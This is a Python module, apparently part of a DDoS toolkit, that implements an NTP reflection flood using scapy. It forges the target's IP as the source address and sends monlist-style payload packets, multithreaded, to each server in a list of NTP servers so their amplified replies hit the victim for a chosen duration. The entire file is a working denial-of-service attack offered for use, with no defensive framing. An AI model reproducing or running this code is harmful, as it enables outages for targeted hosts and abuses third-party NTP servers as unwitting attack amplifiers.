#!/usr/bin/env python3

import random
import time
from scapy.all import IP, send, Raw, UDP
from threading import Thread

def NTP_ATTACK(threads, attack_time, target):
	# Finish
	global FINISH
	FINISH = False

	target_ip = target.split(":")[0]
	target_port = int(target.split(":")[1])

	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting NTP attack...")
	
	# Payload
	payload = ("\x17\x00\x03\x2a" + "\x00" * 4)
	threads_list = []
	# Load NTP servers list
	with open("tools/other/ntp_servers.txt", 'r') as f:
		ntp_servers = f.readlines()

	# NTP flood
	def ntp_flood():
		global FINISH
		while not FINISH:
			for server in ntp_servers:
				if not FINISH:
					# Packet
					packets = random.randint(10, 150)
					server = server.replace("\n", "")
					
					try:
						packet = IP(dst = server, src = target_ip) / UDP(sport = random.randint(2000,65535), dport = int(target_port)) / Raw(load = payload)
						send( packet, count = packets, verbose = False)
					except Exception as e:
						print(e)
					else:
						print("\033[1;34m"+"[*]"+"\033[0m"+" Sending " + str(packets) + " packets from NTP server: " + server + " to " + target + "...")

	# Start threads
	for thread in range(threads):
		print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread) + "...")
		t = Thread(target = ntp_flood)
		t.start()
		threads_list.append(t)
	# Sleep selected secounds
	time.sleep(attack_time)
	# Terminate threads
	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print("\033[1;77m"+"[i]"+"\033[0m"+" Attack completed.")
